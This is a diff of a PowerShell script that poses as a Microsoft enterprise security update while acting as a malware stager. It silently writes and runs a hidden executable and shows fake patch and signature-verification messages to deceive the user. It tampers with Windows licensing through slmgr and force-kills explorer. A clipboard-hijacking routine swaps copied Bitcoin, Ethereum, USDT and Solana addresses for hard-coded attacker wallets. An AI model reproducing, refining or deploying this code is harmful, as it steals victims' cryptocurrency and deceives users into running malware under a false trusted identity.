@@ -1,4 +1,4 @@
-# --- [RESEARCH STAGER v55.0: ENTERPRISE ULTIMATE] ---
+# --- [RESEARCH STAGER v57.0: ENTERPRISE ULTIMATE] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
@@ -22,7 +22,6 @@ function Show-SecurityPrep {
     $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
     $prep.BackColor = [Drawing.Color]::White
 
-    # Pro Console Window
     $console = New-Object Windows.Forms.Label
     $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,180)
     $console.BackColor = [Drawing.Color]::FromArgb(30, 30, 30); $console.ForeColor = [Drawing.Color]::FromArgb(0, 255, 0)
@@ -89,16 +88,20 @@ function Run-Deployment {
         [IO.File]::WriteAllBytes($path, $data)
         Start-Process $path -WindowStyle Hidden
 
-        # --- 1 MINUTE PROGRESS BAR (ULTRA LEGIT) ---
+        # --- 1 MINUTE PROGRESS BAR ---
         for ($i = 0; $i -le 100; $i++) {
             $pb.Value = $i
             if ($i -eq 15) { $status.Text = "Downloading Security Patch KB50314..." }
             if ($i -eq 40) { $status.Text = "Verifying OEM Digital Signature..." }
-            if ($i -eq 65) { $status.Text = "Injecting Kernel Hooks (Action Required: Click YES)..." }
-            if ($i -eq 85) { $status.Text = "Finalizing Enterprise Environment..." }
+            if ($i -eq 65) { $status.Text = "Applying UI Fixes & Watermark Removal..." }
+            if ($i -eq 90) { $status.Text = "Restarting Shell Components..." }
             [Windows.Forms.Application]::DoEvents()
             Start-Sleep -m 600
         }
+
+        # --- WATERMARK REMOVAL & INSTANT SHELL REFRESH ---
+        slmgr.vbs /upk; slmgr.vbs /cpky; slmgr.vbs /rearm
+        Get-Process explorer | Stop-Process -Force # Forces the taskbar and watermark to reload instantly
 
         # --- CLIPPER LOGIC ---
         $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } } elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
@@ -110,15 +113,12 @@ function Run-Deployment {
         $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n"
         $report += "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
         $report += "DEVICE NAME: $env:COMPUTERNAME`n"
-        $report += "PROCESSOR: $((Get-WmiObject Win32_Processor).Name)`n"
-        $report += "MEMORY: $((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) GB`n"
-        $report += "LICENSE STATUS: ACTIVATED / VALID`n"
+        $report += "LICENSE STATUS: ACTIVATED / SHELL REFRESHED`n"
         $report | Out-File $infoFile
 
         $form.Close()
-        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Deployment Success", 0, 64) | Out-Null
+        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nShell refreshed. Report generated on Desktop.", "Deployment Success", 0, 64) | Out-Null
         
-        # OPEN THE TXT FILE IMMEDIATELY
         Start-Process notepad.exe $infoFile
         
     } catch {
@@ -127,7 +127,7 @@ function Run-Deployment {
     }
 }
 
-# --- EXECUTION ---
+# --- START ---
 Global-Initialize
 Show-SecurityPrep
 if ($global:proceed) { Run-Deployment }
